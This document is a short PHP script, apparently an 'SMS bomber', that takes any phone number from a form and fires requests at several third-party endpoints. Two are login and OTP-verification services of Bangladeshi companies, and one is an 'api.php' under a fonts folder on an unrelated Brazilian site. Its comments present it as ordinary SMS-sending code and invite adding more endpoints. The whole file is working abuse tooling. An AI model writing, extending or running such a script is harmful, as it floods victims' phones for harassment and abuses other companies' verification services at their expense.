<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['phoneNumber']) && isset($_POST['smsAmount'])) {
        $phoneNumber = $_POST['phoneNumber'];
        $smsAmount = $_POST['smsAmount'];

        // Validate and sanitize user input
        $phoneNumber = filter_var($phoneNumber, FILTER_SANITIZE_STRING);
        $smsAmount = filter_var($smsAmount, FILTER_SANITIZE_STRING);

        // Specify your SMS API endpoints
        $apiEndpoints = [
            'http://ultranetrn.com.br/fonts/api.php?number=' . urlencode($phoneNumber),
            'https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=' . urlencode($phoneNumber),
            'https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=' . urlencode($phoneNumber)
            // Add more API endpoints as needed
        ];

        // Initialize an array to store API responses
        $apiResponses = [];

        // Iterate through each API endpoint and send SMS
        foreach ($apiEndpoints as $apiEndpoint) {
            $response = file_get_contents($apiEndpoint . '&smsAmount=' . urlencode($smsAmount));

            // Check if the API call was successful before adding to responses
            if ($response !== false) {
                $apiResponses[] = $response;
            } else {
                // Handle API call failure
                $apiResponses[] = ['error' => 'Failed API call'];
            }
        }

        // Output the API responses (you may want to handle this differently based on your requirements)
        echo json_encode($apiResponses);
    } else {
        // Handle the case when the required parameters are not provided
        echo json_encode(['error' => 'Invalid request']);
    }
} else {
    // Handle requests that are not POST
    echo json_encode(['error' => 'Invalid request method']);
}
?>
